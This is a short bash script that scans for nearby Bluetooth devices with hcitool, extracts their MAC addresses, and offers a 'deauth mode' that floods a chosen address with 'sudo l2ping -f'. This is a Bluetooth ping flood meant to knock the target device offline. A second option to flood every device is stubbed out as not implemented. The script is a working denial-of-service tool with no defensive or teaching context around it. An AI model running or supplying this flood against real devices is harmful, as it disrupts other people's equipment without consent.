#!/bin/bash

format_scan () {
	grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$1" > "$2"
}

read -p "scan mode? (1: BR/EDR | 2: BLE | 3: ALL): " scan_mode

if [ ${scan_mode} = "1" ]; then
	sudo stdbuf -oL hcitool scan | tee scan_br.txt
	format_scan "scan_br.txt" "scan_br_f.txt"

elif [ ${scan_mode} = "2" ]; then
	sudo stdbuf -oL hcitool lescan | tee scan_le.txt
	format_scan "scan_le.txt" "scan_le_f.txt"

elif [ ${scan_mode} = "3" ]; then
	sudo stdbuf -oL hcitool scan | tee scan_br.txt
        sudo stdbuf -oL hcitool lescan | tee scan_le.txt
	format_scan "scan_br.txt" "scan_br_f.txt"
	format_scan "scan_le.txt" "scan_le_f.txt"
else
	echo "Enter a valid mode"
	exit 1
fi

read -p "deauth mode? (1: Spam selected mac | 2: Spam all): " deauth_mode

if [ ${deauth_mode} = "1" ]; then
	read -p "mac address?: " mac
	sudo l2ping -f "$mac"
elif [ ${deauth_mode} = "2" ]; then
	echo "not implemented"
else
	echo "Enter a valid mode"
	exit 1
fi
